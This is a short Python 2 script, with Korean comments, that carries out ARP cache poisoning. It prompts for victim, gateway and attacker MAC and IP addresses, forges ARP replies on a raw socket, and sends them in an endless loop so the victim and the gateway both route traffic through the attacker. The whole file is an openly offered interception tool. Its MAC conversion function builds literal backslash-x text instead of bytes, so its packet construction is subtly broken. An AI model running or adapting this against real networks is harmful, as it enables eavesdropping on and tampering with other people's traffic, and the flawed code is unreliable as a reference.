#-*- coding: utf-8 -*-
import socket, struct, binascii

def makeMacAddress(mac):
    a='\\x'
    tmpMac=mac.replace(':', a)
    mac=a+tmpMac
    return mac

def arpSpoofer(attackerMacAddress, victimMacAddress, gatewayMacAddress, gatewayIP, victimIP):
    s=socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800)) # Using PF_PACKET and Raw Socket, 0x0800 : EETH_P_IP Protocol
    s.bind(("eth0",socket.htons(0x0800))) # eth0 인터페이스를 대상으로 진행
    
    code='\x08\x06' # ARP 프로토콜 코드
    # Ethernet Header : Destination Mac Address(6Byte) + Source Mac Address(6Byte) + Type(2Byte) 
    ethVictim=victimMacAddress+attackerMacAddress+code  
    ethGateway=gatewayMacAddress+attackerMacAddress+code 
    
    # ARP Header Field
    hardwareType='\x00\x01'
    protocolType='\x08\x00'
    hardwareSize='\x06'
    protocolSize='\x04'
    opcode='\x00\x02'
    
    # Ethernet Header + ARP Header
    # 출발지IP(gatewayIP)는 게이트웨이IP인데 맥어드레스(attackerMacAddress)는 공격자의 맥어드레스이다. 
    victimARP=ethVictim+hardwareType+protocolType+hardwareSize+protocolSize+opcode+attackerMacAddress+gatewayIP+victimMacAddress+victimIP 
    # 출발지IP(victimIP)는 피해자 IP인데 맥어드레스(attackerMacAddress)는 공격자의 맥어드레스이다.
    gatewayARP=ethGateway+hardwareType+protocolType+hardwareSize+protocolSize+opcode+attackerMacAddress+victimIP+gatewayMacAddress+gatewayIP
    
    while(1):
        # 피해자에게 패킷을 계속 전송해서 피해자의 ARP Cache Table을 변조된 상태로 유지시킨다.
        s.send(victimARP)
        # 게이트웨이에게 패킷을 계속 전송해서 게이트웨이의 ARP Cache Table을 변조된 상태로 유지시킨다.
        s.send(gatewayARP)
    
def main():
    ama=raw_input("Input attacker or garbage mac address( ex) 00:0c:29:05:9a:08 ) : ") # \x00\x0c\x29\x05\x9a\x08
    vma=raw_input("Input victim mac address : ") # \x28\xe3\x47\x0f\x96\xe9
    gma=raw_input("Input gateway mac address : ") # \x90\x9f\x33\x2f\xe5\x14
    gip=raw_input("Input gateway ip : ")
    vip=raw_input("Input victim ip : ")
    gatewayIP=socket.inet_aton(gip)
    victimIP=socket.inet_aton(vip)
    attackerMacAddress=makeMacAddress(ama)
    victimMacAddress=makeMacAddress(vma)
    gatewayMacAddress=makeMacAddress(gma)
    arpSpoofer(attackerMacAddress, victimMacAddress, gatewayMacAddress, gatewayIP, victimIP)
    
if __name__=="__main__":
    main()